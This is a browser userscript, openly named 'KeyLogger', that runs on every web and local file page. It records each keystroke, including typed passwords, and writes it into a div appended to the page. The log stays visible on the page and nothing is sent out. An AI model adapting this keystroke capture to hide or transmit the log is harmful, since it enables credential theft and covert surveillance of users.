// ==UserScript==
// @name       KeyLogger
// @namespace  http://facebook.com/shivesh96
// @version    0.1
// @description  This Script is written by shievsh chandra to Keep All Key Typed Log from Web Pages
// @match		http://*
// @include 	https://*
// @include 	http://*
// @include 	file://*
// @copyright  2014+, Shivesh96
// ==/UserScript==

var div = document.createElement("Div");
var span = document.createElement("span");
var span2 = document.createElement("span");

div.id="KeyLogger";

span.id = "keyLogged";
span.name = "keyLogged";
span.innerHTML = "Source :"+location+"</br>Date :"+Date()+"</br>KeyYouTyped :";

span2.id = "keyLogged2";
span2.name = "keyLogged2";
span2.innerHTML = "</br>KeyYouTyped :";

div.appendChild(span);
div.appendChild(span2);
document.body.appendChild(div);

var scrpt =  function kydn(evt)
{
    //var textBox = getObject('keyLogged');
    var charCode = (evt.which) ? evt.which : event.keyCode
    var txt = document.getElementById('keyLogged');
    if (charCode == 8) txt.innerHTML = txt.innerHTML +" backspace"; //  backspace
    else{
        if (charCode == 9) txt.innerHTML = txt.innerHTML +" tab"; //  tab
        else{
            if (charCode == 13) txt.innerHTML = txt.innerHTML +" enter"; //  enter
            else{
                if (charCode == 16) txt.innerHTML = txt.innerHTML +" shift"; //  shift
                else{
                    if (charCode == 17) txt.innerHTML = txt.innerHTML +" ctrl"; //  ctrl
                    else{
                        if (charCode == 18) txt.innerHTML = txt.innerHTML +" alt"; //  alt
                        else{
                            if (charCode == 19) txt.innerHTML = txt.innerHTML +" pause/break"; //  pause/break
                            else{
                                if (charCode == 20) txt.innerHTML = txt.innerHTML +" caps lock"; //  caps lock
                                else{
                                    if (charCode == 27) txt.innerHTML = txt.innerHTML +" escape"; //  escape
                                    else{
                                        if (charCode == 32) txt.innerHTML = txt.innerHTML +" Space"; // page up, to avoid displaying alternate character and confusing people	         
                                        else{
                                            if (charCode == 33) txt.innerHTML = txt.innerHTML +" page up"; // page up, to avoid displaying alternate character and confusing people	         
                                            else{
                                                if (charCode == 34) txt.innerHTML = txt.innerHTML +" page down"; // page down
                                                else{
                                                    if (charCode == 35) txt.innerHTML = txt.innerHTML +" end"; // end
                                                    else{
                                                        if (charCode == 36) txt.innerHTML = txt.innerHTML +" home"; // home
                                                        else{
                                                            if (charCode == 37) txt.innerHTML = txt.innerHTML +" left arrow"; // left arrow
                                                            else{
                                                                if (charCode == 38) txt.innerHTML = txt.innerHTML +" up arrow"; // up arrow
                                                                else{
                                                                    if (charCode == 39) txt.innerHTML = txt.innerHTML +" right arrow"; // right arrow
                                                                    else{
                                                                        if (charCode == 40) txt.innerHTML = txt.innerHTML +" down arrow"; // down arrow
                                                                        else{
                                                                            if (charCode == 45) txt.innerHTML = txt.innerHTML +" insert"; // insert
                                                                            else{
                                                                                if (charCode == 46) txt.innerHTML = txt.innerHTML +" delete"; // delete
                                                                                else{
                                                                                    if (charCode == 91) txt.innerHTML = txt.innerHTML +" left window"; // left window
                                                                                    else{
                                                                                        if (charCode == 92) txt.innerHTML = txt.innerHTML +" right window"; // right window
                                                                                        else{
                                                                                            if (charCode == 93) txt.innerHTML = txt.innerHTML +" select key"; // select key
                                                                                            else{
                                                                                                if (charCode == 96) txt.innerHTML = txt.innerHTML +" numpad 0"; // numpad 0
                                                                                                else{
                                                                                                    if (charCode == 97) txt.innerHTML = txt.innerHTML +" numpad 1"; // numpad 1
                                                                                                    else{
                                                                                                        if (charCode == 98) txt.innerHTML = txt.innerHTML +" numpad 2"; // numpad 2
                                                                                                        else{
                                                                                                            if (charCode == 99) txt.innerHTML = txt.innerHTML +" numpad 3"; // numpad 3
                                                                                                            else{
                                                                                                                if (charCode == 100) txt.innerHTML = txt.innerHTML +" numpad 4"; // numpad 4
                                                                                                                else{
                                                                                                                    if (charCode == 101) txt.innerHTML = txt.innerHTML +" numpad 5"; // numpad 5
                                                                                                                    else{
                                                                                                                        if (charCode == 102) txt.innerHTML = txt.innerHTML +" numpad 6"; // numpad 6
                                                                                                                        else{
                                                                                                                            if (charCode == 103) txt.innerHTML = txt.innerHTML +" numpad 7"; // numpad 7
                                                                                                                            else{
                                                                                                                                if (charCode == 104) txt.innerHTML = txt.innerHTML +" numpad 8"; // numpad 8
                                                                                                                                else{
                                                                                                                                    if (charCode == 105) txt.innerHTML = txt.innerHTML +" numpad 9"; // numpad 9
                                                                                                                                    else{
                                                                                                                                        if (charCode == 106) txt.innerHTML = txt.innerHTML +" multiply"; // multiply
                                                                                                                                        else{
                                                                                                                                            if (charCode == 107) txt.innerHTML = txt.innerHTML +" add"; // add
                                                                                                                                            else{
                                                                                                                                                if (charCode == 109) txt.innerHTML = txt.innerHTML +" subtract"; // subtract
                                                                                                                                                else{
                                                                                                                                                    if (charCode == 110) txt.innerHTML = txt.innerHTML +" decimal point"; // decimal point
                                                                                                                                                    else{
                                                                                                                                                        if (charCode == 111) txt.innerHTML = txt.innerHTML +" divide"; // divide
                                                                                                                                                        else{
                                                                                                                                                            if (charCode == 112) txt.innerHTML = txt.innerHTML +" F1"; // F1
                                                                                                                                                            else{
                                                                                                                                                                if (charCode == 113) txt.innerHTML = txt.innerHTML +" F2"; // F2
                                                                                                                                                                else{
                                                                                                                                                                    if (charCode == 114) txt.innerHTML = txt.innerHTML +" F3"; // F3
                                                                                                                                                                    else{
                                                                                                                                                                        if (charCode == 115) txt.innerHTML = txt.innerHTML +" F4"; // F4
                                                                                                                                                                        else{
                                                                                                                                                                            if (charCode == 116) txt.innerHTML = txt.innerHTML +" F5"; // F5
                                                                                                                                                                            else{
                                                                                                                                                                                if (charCode == 117) txt.innerHTML = txt.innerHTML +" F6"; // F6
                                                                                                                                                                                else{
                                                                                                                                                                                    if (charCode == 118) txt.innerHTML = txt.innerHTML +" F7"; // F7
                                                                                                                                                                                    else{
                                                                                                                                                                                        if (charCode == 119) txt.innerHTML = txt.innerHTML +" F8"; // F8
                                                                                                                                                                                        else{
                                                                                                                                                                                            if (charCode == 120) txt.innerHTML = txt.innerHTML +" F9"; // F9
                                                                                                                                                                                            else{
                                                                                                                                                                                                if (charCode == 121) txt.innerHTML = txt.innerHTML +" F10"; // F10
                                                                                                                                                                                                else{
                                                                                                                                                                                                    if (charCode == 122) txt.innerHTML = txt.innerHTML +" F11"; // F11
                                                                                                                                                                                                    else{
                                                                                                                                                                                                        if (charCode == 123) txt.innerHTML = txt.innerHTML +" F12"; // F12
                                                                                                                                                                                                        else{
                                                                                                                                                                                                            if (charCode == 144) txt.innerHTML = txt.innerHTML +" num lock"; // num lock
                                                                                                                                                                                                            else{
                                                                                                                                                                                                                if (charCode == 145) txt.innerHTML = txt.innerHTML +" scroll lock"; // scroll lock
                                                                                                                                                                                                                else{
                                                                                                                                                                                                                    if (charCode == 186) txt.innerHTML = txt.innerHTML +" ;"; // semi-colon
                                                                                                                                                                                                                    else{
                                                                                                                                                                                                                        if (charCode == 187) txt.innerHTML = txt.innerHTML +" ="; // equal-sign
                                                                                                                                                                                                                        else{
                                                                                                                                                                                                                            if (charCode == 188) txt.innerHTML = txt.innerHTML +" ,"; // comma
                                                                                                                                                                                                                            else{
                                                                                                                                                                                                                                if (charCode == 189) txt.innerHTML = txt.innerHTML +" -"; // dash
                                                                                                                                                                                                                                else{
                                                                                                                                                                                                                                    if (charCode == 190) txt.innerHTML = txt.innerHTML +" ."; // period
                                                                                                                                                                                                                                    else{
                                                                                                                                                                                                                                        if (charCode == 191) txt.innerHTML = txt.innerHTML +" /"; // forward slash
                                                                                                                                                                                                                                        else{
                                                                                                                                                                                                                                            if (charCode == 192) txt.innerHTML = txt.innerHTML +" `"; // grave accent
                                                                                                                                                                                                                                            else{
                                                                                                                                                                                                                                                if (charCode == 219) txt.innerHTML = txt.innerHTML +" ["; // open bracket
                                                                                                                                                                                                                                                else{
                                                                                                                                                                                                                                                    if (charCode == 220) txt.innerHTML = txt.innerHTML +" \\"; // back slash
                                                                                                                                                                                                                                                    else{
                                                                                                                                                                                                                                                        if (charCode == 221) txt.innerHTML = txt.innerHTML +" ]"; // close bracket
                                                                                                                                                                                                                                                        else{
                                                                                                                                                                                                                                                            if (charCode == 222) txt.innerHTML = txt.innerHTML +" '"; // single quote
                                                                                                                                                                                                                                                            else{
                                                                                                                                                                                                                                                                txt.innerHTML = txt.innerHTML + " " + String.fromCharCode(charCode);
                                                                                                                                                                                                                                                            }
                                                                                                                                                                                                                                                        }
                                                                                                                                                                                                                                                    }
                                                                                                                                                                                                                                                }
                                                                                                                                                                                                                                            }
                                                                                                                                                                                                                                        }
                                                                                                                                                                                                                                    }
                                                                                                                                                                                                                                }
                                                                                                                                                                                                                            }
                                                                                                                                                                                                                        }
                                                                                                                                                                                                                    }
                                                                                                                                                                                                                }
                                                                                                                                                                                                            }
                                                                                                                                                                                                        }
                                                                                                                                                                                                    }
                                                                                                                                                                                                }
                                                                                                                                                                                            }
                                                                                                                                                                                        }
                                                                                                                                                                                    }
                                                                                                                                                                                }
                                                                                                                                                                            }
                                                                                                                                                                        }
                                                                                                                                                                    }
                                                                                                                                                                }
                                                                                                                                                            }
                                                                                                                                                        }
                                                                                                                                                    }
                                                                                                                                                }
                                                                                                                                            }
                                                                                                                                        }
                                                                                                                                    }
                                                                                                                                }
                                                                                                                            }
                                                                                                                        }
                                                                                                                    }
                                                                                                                }
                                                                                                            }
                                                                                                        }
                                                                                                    }
                                                                                                }
                                                                                            }
                                                                                        }
                                                                                    }
                                                                                }
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
                                                                                                                        
    //var lblCharCode = getObject('spnCode');
    //lblCharCode.innerHTML = 'KeyCode:  ' + charCode;
    return false;
};
var scrpt2 = function kypress(evnt){
    var charC = (evnt.which) ? evnt.which : event.keyCode;
    var txt2 = document.getElementById('keyLogged2');
    txt2.innerHTML = txt2.innerHTML + " " + String.fromCharCode(charC);
}
var scrpt3 = function confirmSave()
{
    //return "You have attempted to leave this page.  If you have made any changes to the fields without clicking the Save button, your changes will be lost.  Are you sure you want to exit this page?";
    alert("save");
}
var scrpt4 = function getObject(obj)
{
    var theObj;
    if (document.all) {
        if (typeof obj=='string') {
            return document.all(obj);
        } else {
            return obj.style;
        }
    }
    if (document.getElementById) {
        if (typeof obj=='string') {
            return document.getElementById(obj);
        } else {
            return obj.style;
        }
    }
    return null;
};

var scriptKey = document.createElement("script");
scriptKey.innerHTML = scrpt+scrpt2+scrpt3+scrpt4;
document.getElementsByTagName("head")[0].appendChild(scriptKey);

if(document.body.onkeydown){
    document.body.setAttribute("onkeydown","javascript:kydn(event);"+document.body.getAttribute("onkeydown"));
}else{
    document.body.setAttribute("onkeydown","javascript:kydn(event);");
}
if(document.body.onkeypress){
    document.body.setAttribute("onkeypress","javascript:kypress(event);"+document.body.getAttribute("onkeypress"));
}else{
    document.body.setAttribute("onkeypress","javascript:kypress(event);");
}
//setTimeout(function(){window.onbeforeunload = confirmSave;},1000);
window.onunload = function() {
    alert('Bye.');
}